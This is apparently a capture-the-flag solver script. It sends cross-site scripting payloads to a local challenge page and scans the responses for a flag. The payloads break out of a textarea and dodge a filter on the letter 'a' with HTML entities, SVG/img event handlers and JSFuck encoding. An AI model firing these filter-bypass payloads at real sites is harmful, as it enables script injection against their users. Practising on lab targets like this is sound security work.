import requests
import re

target_url = "http://127.0.0.1:32887/page"

print("[*] XSS Testing - Breaking out of textarea context\n")

# The injection is in a textarea, so we need to close it first
# Also, there's a filter blocking 'a' character

test_payloads = [
    # Close textarea and inject script
    '</textarea><script>alert("XSS")</script>',
    '</textarea><script>alert(1)</script>',
    '</textarea><img src=x onerror=alert(1)>',
    
    # Try without 'a' character
    '</textre><<<script>>>confirm(1)<<</script>>>',
    
    # Using HTML entities or encoding to bypass 'a'
    '</te&#120;t&#97;re&#97;><script>&#97;lert(1)</script>',
    
    # Try SVG
    '</textarea><svg/onload=alert(1)>',
    '</textarea><svg/onload=confirm(1)>',
    
    # Try with comment to handle remaining tags
    '</textarea><script>alert(1)</script><!--',
    
    # Alternative without 'a'
    '</textre><img src=x onerror=confirm(1)>',
    '</textre><svg onlo&#97;d=&#97;lert(1)>',
]

for payload in test_payloads:
    print(f"\n[TEST] Payload: {payload}")
    print(f"[+] Contains 'a': {'Yes' if 'a' in payload.lower() else 'No'}")
    
    try:
        resp = requests.post(target_url, data={"name": payload}, timeout=10)
        print(f"[+] Status: {resp.status_code} | Length: {len(resp.content)}B")
        
        # Check for filter message
        if "Sorry you can't use:" in resp.text:
            filter_msg = re.search(r"Sorry you can't use: '([^']+)'", resp.text)
            if filter_msg:
                print(f"[!] FILTERED: Character '{filter_msg.group(1)}' blocked")
        
        # Look for successful injection (no textarea closing our payload)
        if payload in resp.text:
            # Check if it's properly injected (outside textarea)
            idx = resp.text.find(payload)
            context = resp.text[max(0, idx-80):min(len(resp.text), idx+len(payload)+80)]
            print(f"[+] Injection context:")
            print(context)
        
        # Search for flags
        flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
        if flags:
            print(f"\n[!!!] FLAG FOUND: {flags}")
            print(f"\n[+] Full response:\n{resp.text}")
            
    except Exception as e:
        print(f"[-] Error: {e}")

# Now try JSFuck without 'a' character - we need to construct alert without 'a'
print("\n\n" + "="*60)
print("Testing JSFuck approach without 'a' character")
print("="*60)

# JSFuck typically generates 'a' in strings, so we need pure JSFuck
# Let's build a payload that closes textarea without 'a'

jsfuck_payloads = [
    # Close textarea (no 'a'), then pure JSFuck
    '</textre><script>[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((+{}+[])[+!+[]]+(!![]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([]+{})[!+[]+!+[]+!+[]+!+[]+!+[]]+([]+{})[+!+[]]+(!![]+[])[+[]]+([]+{})[!+[]+!+[]+!+[]+!+[]+!+[]]+(+{}+[])[+!+[]]+([][[]]+[])[+[]]+([]+{})[!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([]+{})[+!+[]]+(!![]+[])[+[]]+([]+{})[!+[]+!+[]+!+[]+!+[]+!+[]]+(+{}+[])[+!+[]])();</script>',
]

for payload in jsfuck_payloads:
    print(f"\n[TEST] JSFuck payload (length: {len(payload)})")
    print(f"[+] Contains 'a': {'Yes' if 'a' in payload.lower() else 'No'}")
    print(f"[+] Payload start: {payload[:60]}...")
    print(f"[+] Payload end: ...{payload[-60:]}")
    
    try:
        resp = requests.post(target_url, data={"name": payload}, timeout=10)
        print(f"[+] Status: {resp.status_code} | Length: {len(resp.content)}B")
        
        # Check for filter message
        if "Sorry you can't use:" in resp.text:
            filter_msg = re.search(r"Sorry you can't use: '([^']+)'", resp.text)
            if filter_msg:
                print(f"[!] FILTERED: Character '{filter_msg.group(1)}' blocked")
        else:
            print(f"[!] No filter message - payload may have passed!")
        
        # Search for flags
        flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
        if flags:
            print(f"\n[!!!] FLAG FOUND: {flags}")
            print(f"\n[+] Full response:\n{resp.text}")
            
    except Exception as e:
        print(f"[-] Error: {e}")

